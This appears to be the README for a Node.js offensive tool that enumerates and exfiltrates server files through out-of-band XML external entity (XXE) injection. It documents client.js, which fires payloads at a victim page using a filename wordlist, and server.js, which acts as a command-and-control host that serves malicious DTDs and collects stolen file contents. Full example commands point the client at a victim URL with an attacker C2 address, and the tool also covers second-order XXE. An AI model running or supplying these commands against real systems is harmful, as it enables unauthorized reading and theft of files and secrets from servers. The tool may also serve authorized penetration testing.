# XXE Enum
Enumerate and exfiltrate files via out of band XXE, for situations where resolved entity is not displayed in the response, and directory listing is not available.

client.js would take a list of filenames, try exfiltrate the content of those files via XXE from your main target server, and server.js would serve external DTDs and receive the exfiltrated file content.

If other servers are parsing XML stored in your main target at a later time, you could also configure your server to serve a different DTD to conduct a different action or to track which server that "/etc/passwd" was from.

## Usage
**server.js**

```
$ node server.js -h

Options
        -h						Print this message

        -p <port>				The listening port, e.g. -p 1337, default 8800
        --b64					Use this option if expecting file content to be passed as base64
        --target <target_ip>	Use this option if you want to send different dtds to different servers, e.g. send "send.dtd" only to your main target (target_ip), and send "send-alt.dtd" to any potential second order XXEs
        --https					Use this option if you want to start https server
        --key <key file>		The key file used to start https server, e.g. --key /root/key.pem
        --cert <cert file>		The cert file used to start https server, e.g --cert /root/cert.crt

// out of the box
$ node server.js

// use a different port
$ node server.js -p 1337

// start a https server
$ node server.js -p 1337 --https --key /root/key.pem --cert /root/cert.crt

// serve send.dtd only to 192.168.1.100, while send send-alt.dtd to all other IPs, if they are requesting the external DTD, i.e. vulnerable to XXE
$ node server.js --target 192.168.1.100
```

**client.js**

```
$ node client.js -h

Options
        -h					Print this message

        -u <url>			(Required) the victim page, e.g. -u http://vulnerable.site:8080/page.php?a=1
        -w <wordlist>		(Required) the wordlist to load, e.g. -w /usr/share/wordlists/filenames.txt
        --c2 <url>			(Required) the server where server.js is run and waiting for incoming request from victim, e.g. --c2 http://attacker.site:8090

        --proxy <proxy>		The http proxy to go through for all requests, e.g. --proxy http://127.0.0.1:8080
        --base <path>		The base path prefixed to all filenames, e.g. --base "/var/www", default "/"
        --php				Use this option if the server can handle php protocols, i.e. able to encode the file content using base64
        -t <thread>			Indicate how many threads to run simultaneously, e.g. -t 15, default 5
        -v					Verbose output
        --headers <headers>	Additional request headers (besides content-type, content-length, and host) in JSON format, e.g. --headers '{"X-CSRF-Token": "awesome_token", "Cookie": "sid=secret_session; admin=1;"}'
        --body <xml>		The normal POST request body, e.g. --body "<subscribe><email>test@example.com</email><name>test</name></subscribe>", default: <login><username>test</username><password>test</password></login>

// minimal
$ node client.js -u http://192.168.1.100/subscribe.php?redirect=1 -w /usr/share/wordlists/filenames.txt --c2 http://192.168.1.200:8800

// full blown
$ node client.js -u http://192.168.1.100/subscribe.php?redirect=1 -w /usr/share/wordlists/filenames.txt --c2 http://192.168.1.200:8800 --proxy http://127.0.0.1:8080 --base "/var/www" -t 15 --php -v --headers '{"Cookie": "sid=secret_session; admin=1;", "Referer": "http://192.168.1.100/index.php"}' --body "<subscribe><email>test@example.com</email><name>test</name></subscribe>"
```

## TODO
- https proxy not working. Only http proxy atm